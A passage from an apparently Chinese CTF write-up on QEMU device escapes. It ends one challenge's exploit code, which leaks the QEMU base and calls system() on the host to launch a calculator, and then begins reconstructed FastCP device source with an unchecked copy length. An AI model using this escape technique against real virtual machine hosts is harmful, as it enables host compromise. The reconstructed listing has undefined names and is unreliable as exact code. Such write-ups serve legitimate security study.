buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    pio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> qemu_base = (mmio_read32(<span class="number">0x20</span>) | (<span class="type">uint64_t</span>)mmio_read32(<span class="number">0x24</span>) &lt;&lt; <span class="number">32</span>) - <span class="number">0x3a9ea8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] qemu_base: %#llx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="type">size_t</span> system_plt = qemu_base + <span class="number">0x2ccb60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt addr: %#llx\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mmio_write32(i * <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">        key[i] = mmio_read32(i * <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    qword_dump(<span class="string">&quot;leak key&quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[] = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(cmd); i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        mmio_write32(i, (*(<span class="type">uint32_t</span>*)&amp;cmd[i]) ^ key[i / <span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_write32(<span class="number">8</span> * <span class="number">4</span>, (system_plt &amp; <span class="number">0xFFFFFFFF</span>) ^ key[<span class="number">8</span>]);</span><br><span class="line">    mmio_write32(<span class="number">9</span> * <span class="number">4</span>, (system_plt &gt;&gt; <span class="number">32</span>) ^ key[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">    pio_write32(<span class="number">0x660</span>, <span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="HWS2021-FastCP"><a href="#HWS2021-FastCP" class="headerlink" title="HWS2021 FastCP"></a>HWS2021 FastCP</h1><h2 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y libjpeg62</span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-core.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qom/object.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_FASTCP <span class="string">&quot;FastCP&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(FastCPState, FASTCP)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* CMD 位（设备语义） */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_CMD_LIST   (1ULL &lt;&lt; 0)   <span class="comment">/* 列表模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_CMD_PULL   (1ULL &lt;&lt; 1)   <span class="comment">/* 拉取 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_CMD_PUSH   (1ULL &lt;&lt; 2)   <span class="comment">/* 推送 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_CMD_IRQ    (1ULL &lt;&lt; 3)   <span class="comment">/* 完成时触发中断 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_IRQ_STATUS_COMPLETE  0x100u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_MMIO_SIZE  (0x100000ULL)   <span class="comment">/* 1 MiB */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCP_TMR_SCALE  1000000         <span class="comment">/* 0xF4240 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CP_state</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> CP_list_src;  <span class="comment">/* 0x00 */</span></span><br><span class="line">    <span class="type">uint64_t</span> CP_list_cnt;  <span class="comment">/* 0x08 */</span></span><br><span class="line">    <span class="type">uint64_t</span> cmd;          <span class="comment">/* 0x10 */</span></span><br><span class="line">&#125; CP_state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> CP_src;  <span class="comment">/* 0x00 */</span></span><br><span class="line">    <span class="type">uint64_t</span> CP_cnt;  <span class="comment">/* 0x08 */</span></span><br><span class="line">    <span class="type">uint64_t</span> CP_dst;  <span class="comment">/* 0x10 */</span></span><br><span class="line">&#125; FastCP_CP_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FastCPState</span> &#123;</span></span><br><span class="line">    PCIDevice    pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    CP_state     cp_state;</span><br><span class="line">    <span class="type">uint8_t</span>      handling;         <span class="comment">/* 1 表示忙 */</span></span><br><span class="line">    <span class="type">uint8_t</span>      _pad[<span class="number">3</span>];</span><br><span class="line">    <span class="type">uint32_t</span>     irq_status;</span><br><span class="line">    <span class="type">char</span>         CP_buffer[<span class="number">0x1000</span>];  <span class="comment">/* 4KiB */</span></span><br><span class="line">    QEMUTimer    cp_timer;</span><br><span class="line">&#125; FastCPState;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- Forward decls ---- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">fastcp_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">fastcp_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">fastcp_cp_timer</span><span class="params">(<span class="type">void</span> *opaque)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps fastcp_mmio_ops = &#123;</span><br><span class="line">    .read  = fastcp_mmio_read,</span><br><span class="line">    .write = fastcp_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- Class/instance init ---- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_FastCP_uninit</span><span class="params">(PCIDevice *pdev)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_FastCP_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">FastCP_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass     *dc = DEVICE_CLASS(oc);</span><br><span class="line">    PCIDeviceClass  *k  = PCI_DEVICE_CLASS(oc);</span><br><span class="line"></span><br><span class="line">    k-&gt;vendor_id = <span class="number">0xDEAD</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0xBEEF</span>;</span><br><span class="line">    k-&gt;revision  = <span class="number">1</span>;</span><br><span class="line">    k-&gt;realize   = pci_FastCP_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>      = pci_FastCP_uninit;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS;</span><br><span class="line"></span><br><span class="line">    dc-&gt;categories[<span class="number">0</span>] |= <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">FastCP_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = FASTCP(obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 反编译代码用对齐方式清零；这里直接 memset，语义等价。 */</span></span><br><span class="line">    <span class="built_in">memset</span>(s-&gt;CP_buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(s-&gt;CP_buffer));</span><br><span class="line">    s-&gt;cp_state.CP_list_src = <span class="number">0</span>;</span><br><span class="line">    s-&gt;cp_state.CP_list_cnt = <span class="number">0</span>;</span><br><span class="line">    s-&gt;cp_state.cmd         = <span class="number">0</span>;</span><br><span class="line">    s-&gt;handling             = <span class="number">0</span>;</span><br><span class="line">    s-&gt;irq_status           = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- Realize/uninit ---- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_FastCP_uninit</span><span class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = FASTCP(pdev);</span><br><span class="line"></span><br><span class="line">    timer_del(&amp;s-&gt;cp_timer);</span><br><span class="line">    msi_uninit(pdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_FastCP_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = FASTCP(pdev);</span><br><span class="line"></span><br><span class="line">    pdev-&gt;config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!msi_init(pdev, <span class="number">0</span> <span class="comment">/*cap_offset 由核心自动分配时可为 0*/</span>,</span><br><span class="line">                  <span class="number">1</span> <span class="comment">/*nr_vectors*/</span>, <span class="number">1</span> <span class="comment">/*16bit*/</span>,</span><br><span class="line">                  <span class="literal">false</span> <span class="comment">/*msi64bit*/</span>, errp)) &#123;</span><br><span class="line">        <span class="comment">/* timer_init_full(scale = 1_000_000) */</span></span><br><span class="line">        timer_init_full(&amp;s-&gt;cp_timer, <span class="literal">NULL</span>, QEMU_CLOCK_VIRTUAL,</span><br><span class="line">                        FASTCP_TIMER_SCALE, <span class="number">0</span>, fastcp_cp_timer, s);</span><br><span class="line"></span><br><span class="line">        memory_region_init_io(&amp;s-&gt;mmio, OBJECT(&amp;s-&gt;pdev.qdev),</span><br><span class="line">                              &amp;fastcp_mmio_ops, s,</span><br><span class="line">                              <span class="string">&quot;fastcp-mmio&quot;</span>, FASTCP_MMIO_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 第三个参数按反编译是 0（memory BAR），不改动语义 */</span></span><br><span class="line">        pci_register_bar(pdev, <span class="number">0</span> <span class="comment">/*BAR0*/</span>, <span class="number">0</span> <span class="comment">/*memory space*/</span>, &amp;s-&gt;mmio);</span><br><span class="line"></span><br><span class="line">        s-&gt;irq_status = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- MMIO read/write ----</span></span><br><span class="line"><span class="comment"> * 仅在 [0x00 .. 0x1F] 区间接受 8 字节访问；否则返回 ~0ULL/忽略写入</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">fastcp_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0x08</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;cp_state.CP_list_src;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt;= <span class="number">0x08</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0x00</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s-&gt;handling;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0x10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;cp_state.CP_list_cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0x18</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;cp_state.cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ~<span class="number">0ULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fastcp_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addr &lt;= <span class="number">0x1F</span> &amp;&amp; size == <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0x10</span>) &#123; <span class="comment">/* CP_list_cnt */</span></span><br><span class="line">            <span class="keyword">if</span> (s-&gt;handling != <span class="number">1</span>) &#123;</span><br><span class="line">                s-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (addr == <span class="number">0x18</span>) &#123; <span class="comment">/* cmd */</span></span><br><span class="line">            <span class="keyword">if</span> (s-&gt;handling != <span class="number">1</span>) &#123;</span><br><span class="line">                s-&gt;cp_state.cmd = val;</span><br><span class="line">                <span class="type">int64_t</span> now_ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">                timer_mod(&amp;s-&gt;cp_timer, now_ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (addr == <span class="number">0x08</span>) &#123; <span class="comment">/* CP_list_src */</span></span><br><span class="line">            <span class="keyword">if</span> (s-&gt;handling != <span class="number">1</span>) &#123;</span><br><span class="line">                s-&gt;cp_state.CP_list_src = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fastcp_raise_irq</span><span class="params">(FastCPState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 置 irq_status bit 0x100，然后优先 MSI，否则 INTx */</span></span><br><span class="line">    s-&gt;irq_status |= FASTCP_IRQ_STATUS_COMPLETE;</span><br><span class="line">    <span class="keyword">if</span> (msi_enabled(&amp;s-&gt;pdev)) &#123;</span><br><span class="line">        msi_notify(&amp;s-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pci_set_irq(&amp;s-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fastcp_clear_bits_then_maybe_irq</span><span class="params">(FastCPState *s, <span class="type">uint64_t</span> bits_to_clear)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 注意：原始逻辑是在“清位之后”检查 cmd.bit3，因此这里也如此 */</span></span><br><span class="line">    s-&gt;cp_state.cmd &amp;= ~bits_to_clear;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;cp_state.cmd &amp; FASTCP_CMD_IRQ) &#123;</span><br><span class="line">        fastcp_raise_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fastcp_cp_timer</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    FastCPState *s = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> cmd = s-&gt;cp_state.cmd;</span><br><span class="line"></span><br><span class="line">    FastCP_CP_INFO cp_info;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> FASTCP_CMD_PULL: &#123; <span class="comment">/* 2 */</span></span><br><span class="line">        <span class="type">bool</span> one = (s-&gt;cp_state.CP_list_cnt == <span class="number">1</span>);</span><br><span class="line">        s-&gt;handling = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (one) &#123;</span><br><span class="line">            cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">           <span class="keyword">if</span> (tmp.CP_cnt &gt; <span class="number">0x1000</span>) &#123;</span><br><span class="line">                fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST | FASTCP_CMD_PULL);</span><br><span class="line">                s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cpu_physical_memory_rw(cp_info.CP_src, s-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">/* 不满足 one → 末尾会 cmd=0 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FASTCP_CMD_PUSH: &#123; <span class="comment">/* 4 */</span></span><br><span class="line">        <span class="type">bool</span> one = (s-&gt;cp_state.CP_list_cnt == <span class="number">1</span>);</span><br><span class="line">        s-&gt;handling = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (one) &#123;</span><br><span class="line">            cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">            cpu_physical_memory_rw(cp_info.CP_dst, s-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">/* 清 bit0..2 并按需中断 */</span></span><br><span class="line">            fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST | FASTCP_CMD_PULL | FASTCP_CMD_PUSH);</span><br><span class="line">            s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FASTCP_CMD_LIST: &#123; <span class="comment">/* 1 */</span></span><br><span class="line">        <span class="type">uint64_t</span> cnt = s-&gt;cp_state.CP_list_cnt;</span><br><span class="line">        s-&gt;handling = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cnt &gt; <span class="number">0x10</span>) &#123;</span><br><span class="line">            <span class="comment">/* 直接执行所有项 */</span></span><br><span class="line">            <span class="type">uint64_t</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                FastCP_CP_INFO item;</span><br><span class="line">                cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src + <span class="keyword">sizeof</span>(FastCP_CP_INFO) * i, &amp;item, <span 